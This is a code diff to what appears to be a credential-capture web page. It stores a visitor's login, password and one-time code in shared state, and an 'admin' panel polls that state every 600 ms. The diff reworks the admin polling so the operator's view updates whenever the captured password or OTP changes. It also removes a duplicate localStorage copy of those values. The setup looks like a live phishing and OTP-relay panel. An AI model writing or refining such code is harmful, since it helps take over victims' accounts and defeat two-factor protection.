@@ -305,22 +305,14 @@ tbody tr:hover td{background:#fafbfc;}
 // ============================================================
 // STATE - shared JS variables (same tab) + BroadcastChannel (cross-tab)
 // ============================================================
-const KEY='bna_state', CH='bna_ch', PENDING_KEY='bna_pending';
+const KEY='bna_state', CH='bna_ch';
 const S = { login:'', password:'', otp:'', status:'idle' };
 const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CH) : null;
 
 function setState(upd) {
   Object.assign(S, upd);
   if (BC) BC.postMessage({t:'s', d:{...S}});
-  try {
-    localStorage.setItem(KEY, JSON.stringify(S));
-    localStorage.setItem(PENDING_KEY, JSON.stringify({
-      login: S.login || '',
-      password: S.password || '',
-      otp: S.otp || '',
-      status: S.status || 'idle'
-    }));
-  } catch(e){}
+  try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){}
   onStateChange();
 }
 
@@ -533,15 +525,24 @@ document.getElementById('admOut').addEventListener('click',()=>{if(admTmr)clearI
 // ============================================================
 // ADMIN POLLING
 // ============================================================
-let admTmr=null, lastSt=null;
+let admTmr=null, lastStateSignature=null;
+function stateSignature(s){
+  return JSON.stringify({
+    status: s && s.status ? s.status : 'idle',
+    login: s && s.login ? s.login : '',
+    password: s && s.password ? s.password : '',
+    otp: s && s.otp ? s.otp : ''
+  });
+}
 function startAdmPoll(){
   if(admTmr)clearInterval(admTmr);
   admTmr=setInterval(checkAdm,600);
   checkAdm();
 }
 function checkAdm(){
-  if(S.status===lastSt)return;
-  lastSt=S.status;
+  const sig = stateSignature(S);
+  if(sig===lastStateSignature)return;
+  lastStateSignature=sig;
   updPend();
 }
 function onStateChange(){
@@ -582,7 +583,8 @@ function onStateChange(){
     }
   }
   if(cur==='admin'){
-    if(S.status!==lastSt){lastSt=S.status;updPend();}
+    const sig = stateSignature(S);
+    if(sig!==lastStateSignature){lastStateSignature=sig;updPend();}
   }
 }
 function updPend(){
